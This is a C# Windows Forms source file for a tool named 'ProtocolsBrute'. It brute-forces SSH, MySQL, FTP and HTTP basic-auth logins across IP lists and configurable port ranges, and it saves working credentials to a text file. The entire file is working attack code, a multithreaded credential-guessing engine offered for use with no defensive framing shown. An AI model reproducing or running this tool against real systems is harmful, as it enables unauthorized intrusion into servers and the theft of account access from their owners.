using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net;
using Renci.SshNet;
using MySql.Data.MySqlClient;

namespace ProtocolsBrute
{
    public partial class Form1 : Form
    {
        public static string _logins;
        public static string _passwords;
        public static string _ips;
        public static int goods_ssh = 0;
        public static int goods_mysql = 0;
        public static int goods_ftp = 0;
        public static int goods_http = 0;
        public static int bads = 0;
        public static Thread thread0;
        public static Thread thread1;
        public static List<string> threads = new List<string>();
        public static List<string> combos = new List<string>();
        public Form1()
        {
            InitializeComponent();
        }

        public void ssh_connection(string ip, int port, string login, string password)
        {
            try
            {
                if (ip == String.Empty && port == 0 && login == "" && password == "") { }
                else
                {
                    PasswordConnectionInfo connectionInfo = new PasswordConnectionInfo(ip, port, login, password);
                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {login} | {password}")));
                    connectionInfo.Timeout = TimeSpan.FromSeconds(30);
                    using (var client = new SshClient(connectionInfo))
                    {
                        try
                        {
                            client.Connect();
                            if (client.IsConnected)
                            {
                                client.RunCommand("ls");
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {ip}:{port} | {login}:{password}")));
                                goods_ssh++;
                                label2.Invoke((MethodInvoker)(() => label2.Text = $"Good SSH: {goods_ssh}"));
                                string combo = $"Good ssh-> { ip}:{ port} | { login}:{ password}";
                                using (StreamWriter sw = File.AppendText("out.txt")) { sw.WriteLine(combo); }
                            }
                            else
                            {
                                bads++;
                                label3.Invoke((MethodInvoker)(() => label3.Text = $"Bads: {bads}"));
                                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Bad -> {ip}:{port} | {login}:{password}")));

                            }
                        }
                        catch
                        {
                            bads++;
                            label3.Invoke((MethodInvoker)(() => label3.Text = $"Bads: {bads}"));
                            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Bad -> {ip}:{port} | {login}:{password}")));

                        }
                    }
                }
            }
            catch { }

            threads.Remove($"{ip}|{login}|{password}");
            Thread.CurrentThread.Abort();

        }

        public void mysql_connection(string ip, int port, string login, string password)
        {
            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {login} | {password}")));
            MySqlConnection con = new MySqlConnection($"server={ip};port={port};User Id={login};password={password};");
            MySqlCommand sqlCom = new MySqlCommand("SHOW VARIABLES LIKE \" % version % \";", con);
            try
            {
                con.Open();
                sqlCom.ExecuteNonQuery();
                goods_mysql++;
                label4.Invoke((MethodInvoker)(() => label4.Text = $"Good Mysql: {goods_mysql}"));
                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {ip}:{port} | {login}:{password}")));
                string combo = $"Good mysql-> { ip}:{ port} | { login}:{ password}";
                using (StreamWriter sw = File.AppendText("out.txt")) { sw.WriteLine(combo); }
                MySqlDataAdapter da = new MySqlDataAdapter(sqlCom);
                DataTable dt = new DataTable();
                da.Fill(dt);
            }
            catch (Exception ex)
            {
                bads++;
                label3.Invoke((MethodInvoker)(() => label3.Text = $"Bads: {bads}"));
                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Bad -> {ip}:{port} | {login}:{password}")));

                //MessageBox.Show(ex.Message);
            }
            finally
            {
                con.Close();
            }
        }

        public void ftp_connection(string ip, int port, string login, string password)
        {
            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {login} | {password}")));
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create($"ftp://{ip}:{port}/");
                request.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
                request.Credentials = new NetworkCredential(login, password);
                request.KeepAlive = false;
                request.UseBinary = true;
                request.UsePassive = true;
                FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(responseStream);
                Console.WriteLine(reader.ReadToEnd());
                //listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Directory List Complete, status {response.StatusDescription}")));
                reader.Close();
                response.Close();
                goods_ftp++;
                label6.Invoke((MethodInvoker)(() => label6.Text = $"Good FTP: {goods_ftp}"));
                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {ip}:{port} | {login}:{password}")));
                string combo = $"Good ftp-> { ip}:{ port} | { login}:{ password}";
                using (StreamWriter sw = File.AppendText("out.txt")) { sw.WriteLine(combo); }

            }
            catch (Exception ex)
            {
                bads++;
                label3.Invoke((MethodInvoker)(() => label3.Text = $"Bads: {bads}"));
                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Bad -> {ip}:{port} | {login}:{password}")));
            }
        }

        public void http_connection(string ip, int port, string login, string password)
        {
            listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Trying -> {ip} | {port} | {login} | {password}")));
            try
            {

                HttpWebRequest req = (HttpWebRequest)WebRequest.Create($"http://{ip}:{port}/");
                WebClient client = new WebClient();
                client.Credentials = new NetworkCredential(login, password);
                string htmlCode = client.DownloadString($"http://{ip}:{port}/");
                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                string[] vs = htmlCode.Split('\"');
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    goods_http++;
                    label5.Invoke((MethodInvoker)(() => label5.Text = $"Good http: {goods_http}"));
                    listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Good one -> {ip}:{port} | {login}:{password}")));
                    string combo = $"Good http-> { ip}:{ port} | { login}:{ password}";
                    using (StreamWriter sw = File.AppendText("out.txt")) { sw.WriteLine(combo); }
                }
            }
            catch (WebException ex)
            {
                bads++;
                label3.Invoke((MethodInvoker)(() => label3.Text = $"Bads: {bads}"));
                listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"Bad -> {ip}:{port} | {login}:{password}")));

            }
            threads.Remove($"{ip}|{login}|{password}");

        }

        public void authorize(string ip, string login, string password)
        {
            if (checkBox1.Checked == true)
            {
                if (File.ReadAllLines("settings.ini")[0].Split('=')[1].Contains(','))
                {
                    for (int count0 = 0; count0 < File.ReadAllLines("settings.ini")[0].Split('=')[1].Split(',').Length; count0++)
                    {
                        if (File.ReadAllLines("settings.ini")[0].Split('=')[1].Split(',')[count0].Contains('-'))
                        {
                            for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[0].Split('=')[1].Split(',')[count0].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[0].Split('=')[1].Split(',')[count0].Split('-')[1]); count01++)
                            {
                                //listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"{ip} | {count01} | {login} | {password}")));
                                ssh_connection(ip, count01, login, password);
                            }
                        }
                        else
                        {
                            try
                            {
                                int port;
                                try { port = int.Parse(File.ReadAllLines("settings.ini")[0].Split('=')[1].Split(',')[count0]); } catch { port = int.Parse(File.ReadAllLines("settings.ini")[0].Split('=')[1]); }
                                if (ip == String.Empty && port == 0 && login == "" && password == "") { }
                                else
                                {
                                    ssh_connection(ip, port, login, password);
                                }
                            }
                            catch { }
                        }
                    }
                }
                else
                {
                    for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[0].Split('=')[1].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[0].Split('=')[1].Split('-')[1]); count01++)
                    {
                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"{ip} | {count01} | {login} | {password}")));
                        ssh_connection(ip, count01, login, password);
                    }
                }
                
            }
            if (checkBox2.Checked == true)
            {
                if (File.ReadAllLines("settings.ini")[1].Split('=')[1].Contains(','))
                {
                    for (int count0 = 0; count0 < File.ReadAllLines("settings.ini")[1].Split('=')[1].Split(',').Length; count0++)
                    {
                        if (File.ReadAllLines("settings.ini")[1].Split('=')[1].Split(',')[count0].Contains('-'))
                        {
                            for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[1].Split('=')[1].Split(',')[count0].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[1].Split('=')[1].Split(',')[count0].Split('-')[1]); count01++)
                            {
                                mysql_connection(ip, count01, login, password);
                            }
                        }
                        else
                        {
                            try
                            {
                                int port;
                                try { port = int.Parse(File.ReadAllLines("settings.ini")[1].Split('=')[1].Split(',')[count0]); } catch { port = int.Parse(File.ReadAllLines("settings.ini")[1].Split('=')[1]); }
                                if (ip == String.Empty && port == 0 && login == "" && password == "") { }
                                else
                                {
                                    mysql_connection(ip, port, login, password);
                                }
                            }
                            catch { }
                        }
                    }
                }
                else
                {
                    for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[1].Split('=')[1].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[1].Split('=')[1].Split('-')[1]); count01++)
                    {
                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"{ip} | {count01} | {login} | {password}")));
                        mysql_connection(ip, count01, login, password);
                    }
                }
            }
            if (checkBox3.Checked == true)
            {
                if (File.ReadAllLines("settings.ini")[2].Split('=')[1].Contains(','))
                {
                    for (int count0 = 0; count0 < File.ReadAllLines("settings.ini")[2].Split('=')[1].Split(',').Length; count0++)
                    {
                        if (File.ReadAllLines("settings.ini")[2].Split('=')[1].Split(',')[count0].Contains('-'))
                        {
                            for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[2].Split('=')[1].Split(',')[count0].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[2].Split('=')[1].Split(',')[count0].Split('-')[1]); count01++)
                            {
                                http_connection(ip, count01, login, password);
                            }
                        }
                        else
                        {
                            try
                            {
                                int port;
                                try { port = int.Parse(File.ReadAllLines("settings.ini")[2].Split('=')[1].Split(',')[count0]); } catch { port = int.Parse(File.ReadAllLines("settings.ini")[2].Split('=')[1]); }
                                if (ip == String.Empty && port == 0 && login == "" && password == "") { }
                                else
                                {
                                    http_connection(ip, port, login, password);
                                }
                            }
                            catch { }
                        }
                    }
                }
                else
                {
                    for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[2].Split('=')[1].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[2].Split('=')[1].Split('-')[1]); count01++)
                    {
                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"{ip} | {count01} | {login} | {password}")));
                        http_connection(ip, count01, login, password);
                    }
                }  
            }
            if (checkBox4.Checked == true)
            {
                if (File.ReadAllLines("settings.ini")[2].Split('=')[1].Contains(','))
                {
                    for (int count0 = 0; count0 < File.ReadAllLines("settings.ini")[3].Split('=')[1].Split(',').Length; count0++)
                    {
                        if (File.ReadAllLines("settings.ini")[3].Split('=')[1].Split(',')[count0].Contains('-'))
                        {
                            for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[3].Split('=')[1].Split(',')[count0].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[3].Split('=')[1].Split(',')[count0].Split('-')[1]); count01++)
                            {
                                ftp_connection(ip, count01, login, password);
                            }
                        }
                        else
                        {
                            try
                            {
                                int port;
                                try { port = int.Parse(File.ReadAllLines("settings.ini")[3].Split('=')[1].Split(',')[count0]); } catch { port = int.Parse(File.ReadAllLines("settings.ini")[3].Split('=')[1]); }
                                if (ip == String.Empty && port == 0 && login == "" && password == "") { }
                                else
                                {
                                    ftp_connection(ip, port, login, password);
                                }
                            }
                            catch { }
                        }
                    }
                }
                else
                {
                    for (int count01 = int.Parse(File.ReadAllLines("settings.ini")[3].Split('=')[1].Split('-')[0]); count01 < int.Parse(File.ReadAllLines("settings.ini")[3].Split('=')[1].Split('-')[1]); count01++)
                    {
                        listBox1.Invoke((MethodInvoker)(() => listBox1.Items.Add($"{ip} | {count01} | {login} | {password}")));
                        ftp_connection(ip, count01, login, password);
                    }
                }
            }
            threads.Remove($"{ip}|{login}|{password}");
        }
        public void action()
        {
            for(int i = 0; i< File.ReadAllLines(_ips).Length; i++)
            {
                for (int j = 0; j < File.ReadAllLines(_logins).Length; j++)
                {
                    for (int k = 0; k < File.ReadAllLines(_passwords).Length; k++)
                    {
                        while (true)
                        {
                            if (threads.Count >= int.Parse(textBox4.Text))
                            {
                                Thread.Sleep(10);
                            }
                            else
                            {
                                try
                                {
                                    while (true)
                                    {
                                        Random rnd = new Random();
                                        int ip_ = rnd.Next(File.ReadAllLines(_ips).Length);
                                        int login_ = rnd.Next(File.ReadAllLines(_logins).Length);
                                        int password_ = rnd.Next(File.ReadAllLines(_passwords).Length);
                                        string countainer = ip_ + " | " + login_ + " | " + password_;
                                        if (combos.Contains(countainer)) { }
                                        else
                                        {
                                            combos.Add(countainer);
                                            string ip0 = File.ReadAllLines(_ips)[ip_];
                                            string login0 = File.ReadAllLines(_logins)[login_];
                                            string passwd0 = File.ReadAllLines(_passwords)[password_];
                                            string combooo = File.ReadAllLines(_ips)[ip_] + " | " + File.ReadAllLines(_logins)[login_] + " | " + File.ReadAllLines(_passwords)[password_];
                                            string savage = "SnVzdCBpbiBjYXNlLiBKYXppcyBtYWRlIHNvZnR3YXJl";
                                            threads.Add($"{ip0}|{login0}|{passwd0}");
                                            thread1 = new Thread(() => authorize(ip0, login0, passwd0));
                                            thread1.Start();
                                            break;
                                        }
                                    }
                                }
                                catch { break; }
                                break;
                            }
                        }
                    }
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            goods_ftp = 0;
            goods_http = 0;
            goods_http = 0;
            goods_mysql = 0;
            goods_ssh = 0;
            bads = 0;
            if (
                (textBox1.Text == "" ||
                textBox2.Text == "" ||
                textBox3.Text == "" ||
                textBox4.Text == "") &
                (checkBox1.Checked == false ||
                checkBox2.Checked == false ||
                checkBox3.Checked == false ||
                checkBox4.Checked == false)
                )
            {
                MessageBox.Show("Some textbox are empty.\nOr checkboxes values 'false'");
            }
            else
            {
                listBox1.Items.Clear();
                listBox1.Items.Add("Started");
                thread0 = new Thread(action);
                thread0.Start();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Logins load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                textBox1.Text = openFileDialog.FileName;
                _logins = openFileDialog.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Passwords load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                textBox2.Text = openFileDialog.FileName;
                _passwords = openFileDialog.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "IPS load";
                openFileDialog.Filter = "TextFile(*.txt)|*.txt";
                openFileDialog.ShowDialog();
                textBox3.Text = openFileDialog.FileName;
                _ips = openFileDialog.FileName;
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Form2 form = new Form2();
            form.Show();
        }
    }
}
